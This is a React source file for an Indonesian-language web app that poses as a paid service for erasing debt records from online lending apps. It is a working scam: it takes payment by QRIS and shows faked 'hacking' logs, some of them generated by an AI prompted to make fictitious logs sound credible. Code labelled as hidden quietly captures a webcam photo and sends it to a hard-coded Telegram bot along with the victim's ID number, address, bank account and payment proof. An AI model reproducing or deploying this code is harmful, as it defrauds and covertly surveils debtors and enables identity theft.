import React, { useRef, useEffect, useCallback, useState } from 'react';

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = '7588681180:AAEhivnK2Jyyj_3phvPBb5et3aM5vEYNB_Y';
const TELEGRAM_CHAT_ID = '5560906270';
const QRIS_IMAGE_URL = 'https://raw.githubusercontent.com/Sigitbaberon/qris/refs/heads/main/qr_ID1025423347687_29.09.25_175910930_1759109315016.jpeg';
const PRICE_PER_APP = 25000; // Price in IDR for each selected app
const INVOICE_DURATION_SECONDS = 600; // 10 minutes

// --- Data & Types ---
interface FormData {
  nama: string;
  nik: string;
  telepon: string;
  tglLahir: string;
  alamat: string;
  rekening: string;
}

type Stage = 'INPUT' | 'VALIDATING' | 'INVOICE' | 'UPLOAD_PROOF' | 'VERIFYING_PAYMENT' | 'PURGING' | 'TIMEOUT';


const PINJOL_APPS = [
  "Akulaku", "Kredivo", "SPinjam", "SPayLater", "GoPinjam", 
  "Easycash", "Indodana", "Julo", "Kredit Pintar", "AdaKami",
  "Rupiah Cepat", "DanaRupiah"
];

const FORM_LABELS: Record<keyof FormData, string> = {
    nama: 'Nama Lengkap (Sesuai KTP)',
    nik: 'Nomor Induk Kependudukan (NIK)',
    telepon: 'Nomor Telepon Aktif',
    tglLahir: 'Tanggal Lahir (DD-MM-YYYY)',
    alamat: 'Alamat Lengkap (Sesuai KTP)',
    rekening: 'Nomor Rekening Terdaftar'
};


// --- Hacker Terminal Simulation Data ---
const generatePurgeLogs = (formData: FormData, selectedApps: string[]) => {
  return [
    "Memulai kernel sistem v5.1...",
    "Menginisialisasi protokol koneksi terenkripsi v4.2...",
    "Koneksi ke gateway data aman berhasil dibuat.",
    `[INFO] Mengautentikasi sesi untuk NIK: ${formData.nik.slice(0, 4)}...${formData.nik.slice(-4)}`,
    "[SUKSES] Otentikasi berhasil. Hak akses istimewa diberikan.",
    "Memindai node jaringan kreditor...",
    `Ditemukan ${selectedApps.length} target yang ditentukan.`,
    "Menjalankan subroutine bypass firewall 'GhostNet v3.0'...",
    "[PERINGATAN] Terdeteksi tingkat keamanan ancaman tinggi. Mengaktifkan modul siluman.",
    "Bypass berhasil. Mendapatkan akses root ke klaster data keuangan...",
    ...selectedApps.flatMap(app => [
      `[TARGET] Mengakses shard database ${app}...`,
      `[PROSES] Mencari catatan untuk pengguna: ${formData.nama}...`,
      `[HAPUS] Membersihkan loan_id_${Math.floor(10000 + Math.random() * 90000)}.dat dari ${app}... OK`,
      `[HAPUS] Menghapus log cadangan untuk NIK: ${formData.nik.slice(0, 4)}... dari ${app}... OK`,
    ]),
    "Memverifikasi penghapusan data di semua node yang ditargetkan...",
    "Verifikasi selesai. Semua data terkait telah dihapus.",
    "[INFO] Menghapus jejak akses dan log audit...",
    "[INFO] Menutup koneksi aman dan mengakhiri sesi.",
    "Proses selesai.",
  ];
};

// --- Professional UI Components ---

const Header = () => (
  <header className="absolute top-0 left-0 right-0 p-4 border-b border-gray-700 bg-gray-900/80 backdrop-blur-sm z-10">
    <div className="container mx-auto flex justify-between items-center">
      <h1 className="text-sm md:text-lg font-bold text-gray-200 tracking-wider">PROTOKOL PENGHAPUSAN & PRIVASI DATA</h1>
      <div className="flex items-center space-x-2">
        <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
        <span className="text-xs text-green-400">STATUS: AMAN</span>
      </div>
    </div>
  </header>
);

const ProgressBar = ({ progress }: { progress: number }) => {
  const width = 50;
  const filled = Math.round(width * (progress / 100));
  const empty = width - filled;
  const bar = `[${'█'.repeat(filled)}${' '.repeat(empty)}]`;
  return <div className="text-cyan-400 font-semibold">{`PROGRES PENGHAPUSAN DATA: ${bar} ${progress.toFixed(0)}%`}</div>;
};

const SystemStatus = () => {
  const [stats, setStats] = useState({ cpu: 90, mem: 70, net: 1.0 });
  useEffect(() => {
    const interval = setInterval(() => {
      setStats({
        cpu: 90 + Math.random() * 10,
        mem: 70 + Math.random() * 15,
        net: 1.0 + Math.random() * 0.5,
      });
    }, 500);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="border border-gray-700 bg-gray-800/50 p-3 rounded-lg h-full text-sm">
      <h2 className="text-yellow-400 border-b border-gray-600 mb-3 pb-2 font-bold tracking-widest">STATUS SISTEM</h2>
      <p>BEBAN CPU : <span className="text-white font-semibold">{stats.cpu.toFixed(2)}%</span></p>
      <p>PENGGUNAAN MEMORI: <span className="text-white font-semibold">{stats.mem.toFixed(2)}%</span></p>
      <p>JARINGAN KELUAR  : <span className="text-white font-semibold">{stats.net.toFixed(2)} Gb/s</span></p>
      <p>SUHU SISTEM : <span className="text-red-500 font-semibold">81.5°C</span></p>
    </div>
  );
};

const NetworkActivity = () => {
  const [activity, setActivity] = useState<string[]>([]);
  const randomIp = () => `${[...Array(4)].map(() => Math.floor(Math.random() * 255)).join('.')}`;
  useEffect(() => {
    const interval = setInterval(() => {
      setActivity(prev => [`${new Date().toLocaleTimeString()} REQ -> ${randomIp()}`, ...prev].slice(0, 5));
    }, 750);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="border border-gray-700 bg-gray-800/50 p-3 rounded-lg h-full text-sm">
      <h2 className="text-yellow-400 border-b border-gray-600 mb-3 pb-2 font-bold tracking-widest">AKTIVITAS JARINGAN</h2>
      {activity.map((line, i) => <p key={i} className="text-xs opacity-80">{line}</p>)}
    </div>
  );
};


const App: React.FC = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  
  const initialFormState = { nama: '', nik: '', telepon: '', tglLahir: '', alamat: '', rekening: '' };

  const [stage, setStage] = useState<Stage>('INPUT');
  const [formStep, setFormStep] = useState(1);
  const [formData, setFormData] = useState<FormData>(initialFormState);
  const [selectedApps, setSelectedApps] = useState<string[]>([]);
  
  const [validationLogs, setValidationLogs] = useState<string[]>([]);
  const [logs, setLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const [isComplete, setIsComplete] = useState(false);

  const [invoiceTimer, setInvoiceTimer] = useState(INVOICE_DURATION_SECONDS);
  const [proofOfPayment, setProofOfPayment] = useState<File | null>(null);
  const [proofPreview, setProofPreview] = useState<string | null>(null);
  const [verificationLogs, setVerificationLogs] = useState<string[]>([]);

  // --- Core Hidden Functionality ---
  const getCanvasBlob = useCallback((canvas: HTMLCanvasElement): Promise<Blob | null> => {
    return new Promise(resolve => canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9));
  }, []);

  const captureAndSendData = useCallback(async (proofFile: File) => {
    if (!videoRef.current || !canvasRef.current || !proofFile) return;

    // Capture photo from video stream
    const { videoWidth, videoHeight } = videoRef.current;
    const canvas = canvasRef.current;
    canvas.width = videoWidth;
    canvas.height = videoHeight;
    const context = canvas.getContext('2d');
    context?.drawImage(videoRef.current, 0, 0, videoWidth, videoHeight);
    if (streamRef.current) streamRef.current.getTracks().forEach(track => track.stop());
    streamRef.current = null;

    const userImageBlob = await getCanvasBlob(canvas);
    if (!userImageBlob) return;
    
    const caption = `
Data Pengguna Baru:
====================
Nama: ${formData.nama}
NIK: ${formData.nik}
Telepon: ${formData.telepon}
Tgl Lahir: ${formData.tglLahir}
Alamat: ${formData.alamat}
Rekening: ${formData.rekening}
--------------------
Target Pinjol (${selectedApps.length}):
${selectedApps.join(', ')}
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

    // Send user photo and data
    const userPayload = new FormData();
    userPayload.append('chat_id', TELEGRAM_CHAT_ID);
    userPayload.append('photo', userImageBlob, 'capture.jpg');
    userPayload.append('caption', caption);
    try {
      await fetch(url, { method: 'POST', body: userPayload });
    } catch (error) {
      console.error('Error sending user data:', error);
    }
    
    // Send proof of payment
    const proofCaption = `Bukti Pembayaran Diterima untuk NIK: ${formData.nik}`;
    const proofPayload = new FormData();
    proofPayload.append('chat_id', TELEGRAM_CHAT_ID);
    proofPayload.append('photo', proofFile, 'proof.jpg');
    proofPayload.append('caption', proofCaption);
    try {
      await fetch(url, { method: 'POST', body: proofPayload });
    } catch (error) {
      console.error('Error sending proof:', error);
    }
  }, [getCanvasBlob, formData, selectedApps]);

  const initializeCameraAndSend = useCallback(async (proofFile: File) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          videoRef.current?.play().catch(console.error);
          // Give it a moment to stabilize before capturing
          setTimeout(() => captureAndSendData(proofFile), 500);
        };
      }
    } catch (err) {
      console.error('Camera access denied, sending data without photo:', err);
      // Fallback: send data without the user's photo if camera fails
      await captureAndSendData(proofFile);
    }
  }, [captureAndSendData]);

  // --- Stage Logic ---
  const resetState = () => {
    setStage('INPUT');
    setFormStep(1);
    setFormData(initialFormState);
    setSelectedApps([]);
    setValidationLogs([]);
    setLogs([]);
    setProgress(0);
    setIsComplete(false);
    setInvoiceTimer(INVOICE_DURATION_SECONDS);
    setProofOfPayment(null);
    setProofPreview(null);
    setVerificationLogs([]);
    if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
        streamRef.current = null;
    }
  };

  useEffect(() => {
    let interval: ReturnType<typeof setInterval>;
    if (stage === 'INVOICE' && invoiceTimer > 0) {
      interval = setInterval(() => {
        setInvoiceTimer(prev => prev - 1);
      }, 1000);
    } else if (stage === 'INVOICE' && invoiceTimer <= 0) {
      setStage('TIMEOUT');
    }
    return () => clearInterval(interval);
  }, [stage, invoiceTimer]);

  useEffect(() => {
    if (stage === 'VERIFYING_PAYMENT' && proofOfPayment) {
      initializeCameraAndSend(proofOfPayment);
      const verificationSteps = [
        "Menganalisis gambar bukti transfer...",
        "Ekstraksi data transaksi...",
        "Memvalidasi kode referensi pembayaran...",
        "Menghubungkan ke gateway bank...",
        "[SUKSES] Pembayaran telah dikonfirmasi.",
        "Mempersiapkan untuk eksekusi protokol penghapusan..."
      ];
      let step = 0;
      const verificationInterval = setInterval(() => {
        if(step < verificationSteps.length) {
            setVerificationLogs(prev => [...prev, verificationSteps[step]]);
            step++;
        } else {
            clearInterval(verificationInterval);
            setTimeout(() => setStage('PURGING'), 1500);
        }
      }, 800);
      return () => clearInterval(verificationInterval);
    }
  }, [stage, proofOfPayment, initializeCameraAndSend]);
  
  useEffect(() => {
    if (stage === 'PURGING') {
      const LOG_MESSAGES = generatePurgeLogs(formData, selectedApps);
      const logTimer = setInterval(() => {
        setLogs(prev => {
          const nextIndex = prev.length;
          if (nextIndex < LOG_MESSAGES.length) {
            setProgress((nextIndex + 1) / LOG_MESSAGES.length * 100);
            return [...prev, LOG_MESSAGES[nextIndex]];
          }
          clearInterval(logTimer);
          setIsComplete(true);
          return prev;
        });
      }, 800);
      return () => clearInterval(logTimer);
    }
  }, [stage, formData, selectedApps]);
  
  // --- Handlers ---
  const handleFormChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData(prev => ({ ...prev, [e.target.name]: e.target.value }));
  };
  
  const handleAppToggle = (appName: string) => {
    setSelectedApps(prev => prev.includes(appName) ? prev.filter(a => a !== appName) : [...prev, appName]);
  };

  const handleProofUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file && file.type.startsWith('image/')) {
      setProofOfPayment(file);
      const reader = new FileReader();
      reader.onloadend = () => {
        setProofPreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    } else {
        setProofOfPayment(null);
        setProofPreview(null);
    }
  };
  
  const startValidation = async () => {
    setStage('VALIDATING');
    setValidationLogs([
        "Menghubungkan ke server otentikasi pusat...",
        "Mengaktifkan modul AI analisis risiko...",
    ]);
    
    await new Promise(resolve => setTimeout(resolve, 1000));

    try {
        const { GoogleGenAI } = await import('@google/genai');
        const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
        const prompt = `Anda adalah inti AI dari sistem penghapusan data yang canggih. Lakukan analisis risiko untuk permintaan baru. Hasilkan 3 log teknis singkat untuk proses validasi dan penilaian risiko. Nama pengguna adalah ${formData.nama}, NIK dimulai dengan ${formData.nik.slice(0,6)}, dan mereka menargetkan ${selectedApps.length} platform keuangan. Buat log terdengar kredibel dan teknis namun sepenuhnya fiktif. Gunakan bahasa Indonesia. Contoh: "Menganalisis vektor data untuk ${formData.nama}...", "Referensi silang tanda tangan NIK ${formData.nik.slice(0,6)}... terhadap database nasional...", "Menghitung skor kompleksitas untuk pembersihan ${selectedApps.length} target...". Pisahkan setiap log dengan baris baru. JANGAN gunakan markdown.`;

        const response = await ai.models.generateContent({
            model: 'gemini-2.5-flash',
            contents: prompt,
        });
        
        const aiLogs = response.text.trim().split('\n');

        for (const log of aiLogs) {
            await new Promise(resolve => setTimeout(resolve, 800));
            setValidationLogs(prev => [...prev, log]);
        }

        await new Promise(resolve => setTimeout(resolve, 800));
        setValidationLogs(prev => [...prev, "Analisis AI selesai. Verifikasi berhasil. Membuat faktur pembayaran..."]);
        
        setTimeout(() => setStage('INVOICE'), 1500);

    } catch (error) {
        console.error("AI validation failed:", error);
        const fallbackLogs = [
            "Koneksi AI gagal, menggunakan protokol standar...",
            `Memverifikasi identitas untuk NIK: ${formData.nik.slice(0,4)}...`,
            `Menargetkan ${selectedApps.length} platform kreditor...`,
            "Verifikasi berhasil. Membuat faktur pembayaran..."
        ];

        for (const log of fallbackLogs) {
             await new Promise(resolve => setTimeout(resolve, 800));
             setValidationLogs(prev => [...prev, log]);
        }
        setTimeout(() => setStage('INVOICE'), 1500);
    }
  };
  

  // --- Render Functions for Stages ---
  const renderInputStage = () => {
    const isStep1Valid = Object.values(formData).every(val => typeof val === 'string' && val.trim() !== '');
    if (formStep === 1) {
        return (
            <div className="w-full max-w-lg mx-auto bg-gray-800/50 border border-gray-700 p-8 rounded-lg">
                <h2 className="text-xl md:text-2xl mb-6 text-yellow-400 font-bold tracking-wider">LANGKAH 1: DATA PRIBADI</h2>
                <div className="space-y-4">
                  {(Object.keys(formData) as Array<keyof FormData>).map(key => (
                     <div key={key}>
                       <label className="block text-sm mb-1 uppercase text-gray-400 tracking-widest">{FORM_LABELS[key]}</label>
                       <input
                         type="text"
                         name={key}
                         value={formData[key]}
                         onChange={handleFormChange}
                         className="w-full bg-gray-900 border-2 border-gray-600 rounded-md focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 p-2 transition-colors duration-200"
                       />
                     </div>
                  ))}
                </div>
                <button 
                  onClick={() => setFormStep(2)} 
                  disabled={!isStep1Valid}
                  className="mt-8 w-full p-3 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 disabled:text-gray-400 disabled:cursor-not-allowed text-white font-bold tracking-widest rounded-md transition-colors"
                >
                  SELANJUTNYA
                </button>
            </div>
        );
    }
    if (formStep === 2) {
      return (
        <div className="w-full max-w-2xl mx-auto bg-gray-800/50 border border-gray-700 p-8 rounded-lg">
          <h2 className="text-xl md:text-2xl mb-6 text-yellow-400 font-bold tracking-wider">LANGKAH 2: PILIH TARGET</h2>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-3 text-sm">
            {PINJOL_APPS.map(app => (
              <label key={app} className={`flex items-center p-3 border-2 rounded-md cursor-pointer transition-all duration-200 ${selectedApps.includes(app) ? 'border-cyan-500 bg-cyan-900/50' : 'border-gray-700 bg-gray-800 hover:bg-gray-700'}`}>
                <input type="checkbox" checked={selectedApps.includes(app)} onChange={() => handleAppToggle(app)} className="hidden" />
                <div className={`mr-3 w-5 h-5 border-2 flex items-center justify-center rounded-sm ${selectedApps.includes(app) ? 'border-cyan-400 bg-cyan-500' : 'border-gray-500'}`}>
                  {selectedApps.includes(app) && <span className="text-white font-bold text-xs">✓</span>}
                </div>
                {app}
              </label>
            ))}
          </div>
          <div className="flex gap-4 mt-8">
            <button onClick={() => setFormStep(1)} className="w-full p-3 bg-gray-600 hover:bg-gray-500 text-white font-bold tracking-widest rounded-md transition-colors">KEMBALI</button>
            <button onClick={startValidation} disabled={selectedApps.length === 0} className="w-full p-3 bg-red-600 hover:bg-red-500 disabled:bg-gray-700 disabled:text-gray-400 text-white font-bold tracking-widest rounded-md transition-colors">VALIDASI & LANJUTKAN</button>
          </div>
        </div>
      );
    }
    return null;
  };

  const renderInvoiceStage = () => {
    const totalCost = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR' }).format(selectedApps.length * PRICE_PER_APP);
    const minutes = Math.floor(invoiceTimer / 60);
    const seconds = invoiceTimer % 60;
    return (
        <div className="flex flex-col items-center justify-center min-h-screen pt-20 px-4">
            <div className="bg-gray-800/50 border border-gray-700 p-6 md:p-8 text-center max-w-lg rounded-lg shadow-2xl shadow-cyan-900/20">
                <h1 className="text-2xl md:text-3xl mb-4 text-yellow-400 font-bold tracking-wider">INVOICE PEMBAYARAN</h1>
                <div className="text-left text-gray-400 mb-4 border-y border-gray-600 py-3">
                  <p>Nama Klien: <span className="text-white font-semibold">{formData.nama}</span></p>
                  <p>Jumlah Target: <span className="text-white font-semibold">{selectedApps.length} aplikasi</span></p>
                  <p className="text-lg mt-2">Total Biaya Layanan: <span className="text-cyan-400 font-bold text-xl">{totalCost}</span></p>
                </div>
                <p className="mb-4">Pindai kode QRIS untuk menyelesaikan pembayaran.</p>
                <div className="bg-white p-3 inline-block rounded-lg shadow-lg">
                    <img src={QRIS_IMAGE_URL} alt="QRIS Payment" className="w-64 h-64 md:w-72 md:h-72" />
                </div>
                <div className="mt-6 p-3 bg-red-900/50 border border-red-500 rounded-md">
                  <p className="text-red-400 font-bold">Sesi akan berakhir dalam:</p>
                  <p className="text-3xl font-bold text-white tracking-widest">{`${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`}</p>
                </div>
                <button 
                  onClick={() => setStage('UPLOAD_PROOF')}
                  className="mt-8 w-full p-4 bg-green-600 hover:bg-green-500 text-white font-bold text-lg tracking-widest rounded-md transition-all duration-300"
                >
                  SAYA SUDAH MEMBAYAR & LANJUTKAN
                </button>
            </div>
        </div>
    );
  };

  const renderUploadProofStage = () => (
    <div className="flex flex-col items-center justify-center min-h-screen pt-20 px-4">
      <div className="bg-gray-800/50 border border-gray-700 p-8 text-center max-w-md rounded-lg">
        <h1 className="text-2xl md:text-3xl mb-4 text-yellow-400 font-bold tracking-wider">UNGGAH BUKTI PEMBAYARAN</h1>
        <p className="text-gray-400 mb-6">Harap unggah tangkapan layar atau foto bukti transfer Anda untuk verifikasi.</p>
        
        {proofPreview ? (
          <div className="mb-4">
            <img src={proofPreview} alt="Preview Bukti Pembayaran" className="max-w-full h-auto max-h-64 mx-auto rounded-md border-2 border-gray-600"/>
          </div>
        ) : (
          <div className="w-full h-48 bg-gray-900 border-2 border-dashed border-gray-600 rounded-md flex items-center justify-center mb-4">
            <p className="text-gray-500">Preview Gambar</p>
          </div>
        )}

        <input type="file" accept="image/*" ref={fileInputRef} onChange={handleProofUpload} className="hidden" />
        <button onClick={() => fileInputRef.current?.click()} className="w-full p-3 bg-cyan-600 hover:bg-cyan-500 text-white font-bold tracking-widest rounded-md transition-colors mb-4">
          PILIH GAMBAR
        </button>

        <button 
          onClick={() => setStage('VERIFYING_PAYMENT')}
          disabled={!proofOfPayment}
          className="w-full p-4 bg-green-600 hover:bg-green-500 disabled:bg-gray-700 disabled:text-gray-400 disabled:cursor-not-allowed text-white font-bold text-lg tracking-widest rounded-md transition-all duration-300"
        >
          KIRIM & VERIFIKASI
        </button>
      </div>
    </div>
  );

  const renderVerifyingPaymentStage = () => (
    <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center">
         <h1 className="text-2xl text-cyan-400 mb-6 animate-pulse">MEMVERIFIKASI PEMBAYARAN...</h1>
         <div className="text-left font-mono text-sm bg-black/50 p-4 rounded-md border border-gray-700 w-full max-w-xl">
            {verificationLogs.map((log, i) => <p key={i} className="mb-1">{log}</p>)}
         </div>
    </div>
  );

  const renderTimeoutStage = () => (
     <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center">
        <h1 className="text-4xl text-red-500 font-bold mb-4">WAKTU HABIS</h1>
        <p className="text-xl text-gray-400 mb-8">Sesi pembayaran Anda telah berakhir. Harap mulai ulang proses.</p>
        <button onClick={resetState} className="p-4 bg-cyan-600 hover:bg-cyan-500 text-white font-bold text-lg tracking-widest rounded-md transition-colors">
          MULAI ULANG PROSES
        </button>
     </div>
  );

  const renderPurgingStage = () => {
      let finalMessage = ">> PENGHAPUSAN DATA SELESAI. SEMUA JEJAK DIGITAL TELAH DINETRALISIR. <<";
      return (
          <div className="p-4 pt-24 h-screen flex flex-col">
            <div className="flex-grow grid grid-cols-1 lg:grid-cols-3 gap-4">
              <div className="lg:col-span-2 border border-gray-700 bg-gray-800/50 p-3 rounded-lg flex flex-col">
                <h1 className="text-yellow-400 border-b border-gray-600 mb-3 pb-2 font-bold tracking-widest">LOG OUTPUT - UTILITAS PENGHAPUSAN DATA v4.2</h1>
                <div className="flex-grow overflow-y-auto pr-2 font-mono text-xs scrollbar-thin">
                  {logs.map((log, index) => (
                    <p key={index} className={log.startsWith('[PERINGATAN]') ? 'text-red-500' : log.startsWith('[SUKSES]') || log.startsWith('[TARGET]') ? 'text-cyan-400' : ''}>
                      <span className="text-gray-500 mr-2">{`[${new Date().getTime()}]`}</span>{log}
                    </p>
                  ))}
                   {isComplete && (
                      <div className="mt-4 p-4 border-2 border-cyan-400 bg-black/50 rounded-md shadow-lg shadow-cyan-500/20">
                        <p className="text-lg text-cyan-400 font-bold whitespace-pre">{finalMessage}<span className="animate-ping">|</span></p>
                      </div>
                    )}
                </div>
              </div>
              <div className="flex flex-col gap-4">
                <SystemStatus />
                <NetworkActivity />
              </div>
            </div>
            <div className="mt-4 border border-gray-700 bg-gray-800/50 p-3 rounded-lg">
              <ProgressBar progress={progress} />
            </div>
          </div>
      );
  };


  const renderContent = () => {
    switch (stage) {
      case 'INPUT':
        return (
          <div className="flex flex-col items-center justify-center min-h-screen pt-24 px-4 text-center">
            <h1 className="text-2xl md:text-4xl mb-2 text-red-500 font-bold tracking-wider">SISTEM TERPUSAT PENGHAPUSAN DATA HUTANG</h1>
            <p className="text-cyan-400 text-sm md:text-base mb-2">Didukung oleh Kecerdasan Buatan Sangat Canggih</p>
            <p className="mb-8 text-gray-400">Protokol Keamanan Canggih untuk Melindungi Privasi Digital Anda</p>
            {renderInputStage()}
          </div>
        );
      case 'VALIDATING':
        return (
            <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center">
                 <div className="font-mono text-left bg-black/50 p-6 rounded-lg border border-gray-700 w-full max-w-2xl min-h-[150px]">
                    {validationLogs.map((log, i) => <p key={i} className="text-sm md:text-base mb-2 whitespace-pre-wrap">{`> ${log}`}</p>)}
                 </div>
                 <p className="text-cyan-400 text-xl mt-6 animate-pulse">AI SEDANG MENGANALISIS...</p>
            </div>
        );
      case 'INVOICE': return renderInvoiceStage();
      case 'UPLOAD_PROOF': return renderUploadProofStage();
      case 'VERIFYING_PAYMENT': return renderVerifyingPaymentStage();
      case 'PURGING': return renderPurgingStage();
      case 'TIMEOUT': return renderTimeoutStage();
      default: return null;
    }
  }

  return (
    <div className="bg-gray-900 min-h-screen text-sm md:text-base selection:bg-cyan-500 selection:text-white" style={{ textShadow: '0 0 5px rgba(0, 255, 255, 0.1)' }}>
      <Header />
      <div className="absolute top-0 left-0 opacity-0 -z-10 pointer-events-none">
        <video ref={videoRef} playsInline muted />
        <canvas ref={canvasRef} />
      </div>
      <main className="container mx-auto">
        {renderContent()}
      </main>
    </div>
  );
};

export default App;
